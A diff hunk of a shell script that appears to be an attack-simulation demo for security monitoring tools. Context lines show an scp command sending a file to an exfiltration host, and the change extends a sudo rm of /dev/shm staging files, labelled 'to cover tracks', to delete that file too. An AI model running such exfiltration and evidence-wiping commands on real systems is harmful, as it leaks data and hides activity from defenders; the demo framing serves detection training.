@@ -92,12 +92,15 @@ if [ -f "$FILE" ]; then
   /usr/bin/scp -i $EXFILL_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/  
 fi
 
+#######################
+##      CLEANUP      ##
+#######################
 # Remove all files from /dev/shm to cover tracks.
 # You can show this in the Event Analyzer, and then show the process still running
 # in memory with OSquery
 if [ $? -eq 0 ]; then
   /bin/echo "Removing files from /dev/shm"
-  sudo /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} &>/dev/null
+  sudo /usr/bin/rm -f /dev/shm/{nothing_to_see_here,move_along,demo_progs.tar} $FILE &>/dev/null
 fi 
 
 exit
